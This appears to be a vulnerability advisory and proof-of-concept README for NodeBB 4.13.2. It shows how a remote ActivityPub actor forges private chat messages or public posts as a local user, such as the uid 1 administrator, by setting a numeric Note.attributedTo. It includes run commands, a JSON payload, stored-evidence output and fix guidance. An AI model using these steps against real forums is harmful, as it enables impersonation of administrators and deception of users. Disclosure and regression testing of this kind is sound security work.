# NodeBB ActivityPub `attributedTo` Local User Spoof PoC

This entry documents and exercises an ActivityPub author-binding flaw in NodeBB `4.13.2`.

A remote ActivityPub actor can submit a signed non-public `Create(Note)` activity to a NodeBB inbox and set the embedded `Note.attributedTo` value to a JSON number such as `1`. NodeBB accepts that numeric value as an internal local uid and creates a private chat message from that local user to another local user.

The same author field is used by the public note path, which lets a remote actor submit public forum content under a local uid when the selected local uid and destination category pass the normal posting checks.

## Affected Target

- Product: NodeBB
- Version verified: `4.13.2`
- Release tag tested: `v4.13.2`
- Feature path: ActivityPub server-to-server inbox
- Required remote capability: an HTTPS ActivityPub actor with a signing key reachable by the target NodeBB instance

## Impact

The private-message path lets a remote federated actor create stored chat content that appears to come from a local NodeBB account. In a clean NodeBB install, uid `1` is commonly the first administrator account, so the practical result is a private chat message from that account to an arbitrary local recipient uid selected by the sender.

The public-post path uses the same unbound author value. A forged numeric `attributedTo` value becomes the author uid used for topic and post creation after the public note path maps recipients and reaches the normal topic creation logic.

## Source Trace

Relevant source locations in NodeBB `4.13.2`:

| File | Behavior |
| --- | --- |
| `src/routes/activitypub.js` | Registers `POST /inbox`, `POST /uid/:uid/inbox`, and `POST /category/:cid/inbox` through ActivityPub middleware |
| `src/middleware/activitypub.js` | Verifies the HTTP signature key against the top-level ActivityPub `actor` |
| `src/middleware/activitypub.js` | Checks the embedded object origin against the top-level actor host |
| `src/activitypub/inbox.js` | Routes non-public `Create` activities to `activitypub.notes.assertPrivate(object)` |
| `src/activitypub/mocks.js` | Normalizes `object.attributedTo` and stores it as `message.uid` |
| `src/activitypub/notes.js` | Creates a chat room with `messaging.newRoom(payload.uid, ...)` |
| `src/messaging/rooms.js` | Adds the supplied room creator uid to `chat:room:<roomId>:uids` |
| `src/messaging/create.js` | Persists chat messages with `fromuid: uid` |

The private-message chain is:

```text
POST /inbox
  controllers.activitypub.postInbox()
    activitypub.inbox.create()
      activitypub.notes.assertPrivate(object)
        activitypub.mocks.message(object)
          uid = object.attributedTo
        messaging.newRoom(payload.uid, { uids: recipients })
        messaging.sendMessage({ ...payload, roomId })
          messaging.addMessage()
            fromuid = uid
```

The top-level ActivityPub actor is authenticated, but the embedded `Note.attributedTo` value is used later as the local sender uid. There is no equality check between the signed top-level actor and the embedded author value before the chat and post creation paths consume it.

## PoC Design

`poc.js` is an external ActivityPub sender. It:

1. Generates a fresh RSA key pair.
2. Hosts a minimal ActivityPub actor and WebFinger response.
3. Signs a `Create(Note)` request with the generated key.
4. Sends the activity to the target NodeBB inbox.
5. Prints the activity id, note id, selected local uid, selected recipient uid, and HTTP response.

The script uses Node.js standard library APIs only.

NodeBB always queries WebFinger over HTTPS on port 443 for the actor hostname. For a local lab, expose the PoC server through a public HTTPS reverse proxy or tunnel and pass that public origin as `--actor-origin`.

## Requirements

- Node.js 20 or newer
- A running stock NodeBB `4.13.2` instance
- ActivityPub enabled on the NodeBB instance
- A local recipient uid on the NodeBB instance
- A public HTTPS actor origin that routes `/.well-known/webfinger` and `/users/<name>` to this PoC process

## Quick Run

Start a public HTTPS tunnel to the PoC server. For example, if the tunnel forwards to `http://127.0.0.1:8088` and gives you `https://attacker.example`, run:

```bash
node poc.js \
  --target-base https://target-nodebb.example \
  --actor-origin https://attacker.example \
  --recipient-uid 2 \
  --spoof-uid 1 \
  --listen-host 127.0.0.1 \
  --listen-port 8088 \
  --output evidence.json
```

Expected output shape:

```json
{
  "targetBase": "https://target-nodebb.example",
  "inboxUrl": "https://target-nodebb.example/inbox",
  "actor": "https://attacker.example/users/mallory",
  "activityId": "https://attacker.example/activities/private-create-...",
  "noteId": "https://attacker.example/private-notes/local-chat-spoof-...",
  "spoofUid": 1,
  "recipientUid": 2,
  "httpStatus": 202,
  "accepted": true
}
```

After a successful run, the target stores a private chat message whose remote message id is the printed `noteId` and whose local sender is the numeric `spoofUid`.

## Direct TLS Mode

If you run the actor service directly on a host with a publicly trusted certificate, pass the certificate and key:

```bash
node poc.js \
  --target-base https://target-nodebb.example \
  --actor-origin https://attacker.example \
  --recipient-uid 2 \
  --spoof-uid 1 \
  --listen-host 0.0.0.0 \
  --listen-port 443 \
  --https-cert /etc/letsencrypt/live/attacker.example/fullchain.pem \
  --https-key /etc/letsencrypt/live/attacker.example/privkey.pem
```

The external origin must match the actor hostname used by the payload, because NodeBB cross-checks WebFinger canonicalization and signature-key ownership against the top-level actor.

## Verification

In a stock lab, verify the result through the recipient account's chat view or by reading the NodeBB database. The stored message key uses the remote note id:

```text
message:<noteId>
```

The stored object contains:

```json
{
  "mid": "<noteId>",
  "fromuid": 1,
  "roomId": 1,
  "content": "<p>private message forged as uid 1</p>"
}
```

The chat room membership includes the forged sender uid and the selected recipient uid:

```text
chat:room:<roomId>:uids = 1, 2
```

The validation run used a clean `v4.13.2` checkout and the stock MongoDB adapter. The stock inbox path accepted the activity and stored:

```json
{
  "nodebbVersion": "4.13.2",
  "activityStatus": 202,
  "messageKey": "message:https://attacker.example/private-notes/local-chat-spoof-1",
  "message": {
    "mid": "https://attacker.example/private-notes/local-chat-spoof-1",
    "fromuid": 1,
    "roomId": 1,
    "content": "<p>private message forged as uid 1</p>"
  },
  "roomUids": [
    "1",
    "2"
  ]
}
```

## Public Post Variant

Use the same signed actor setup and send a public `Create(Note)` with:

```json
{
  "to": [
    "https://www.w3.org/ns/activitystreams#Public",
    "https://target-nodebb.example/category/1"
  ],
  "cc": [],
  "object": {
    "type": "Note",
    "attributedTo": 1,
    "to": [
      "https://www.w3.org/ns/activitystreams#Public",
      "https://target-nodebb.example/category/1"
    ],
    "cc": []
  }
}
```

That path reaches `activitypub.notes.assert()`, then `activitypub.mocks.post()`, then `topics.post()` with the numeric local uid taken from `Note.attributedTo`.

## Fix Direction

- Require inbound `Note.attributedTo` to be an ActivityPub actor URI or actor object with a URI id.
- Reject numeric inbound `attributedTo` values before any mock payload is produced.
- Assert the embedded actor and require it to match the authenticated top-level actor for `Create(Note)`.
- Apply the same author-binding invariant to private messages, public notes, updates, announces that delegate nested activities, and any helper that maps ActivityPub author fields into local uid fields.

## Responsible Use

Use this PoC only for systems you own, systems you are authorized to test, and defensive regression work.
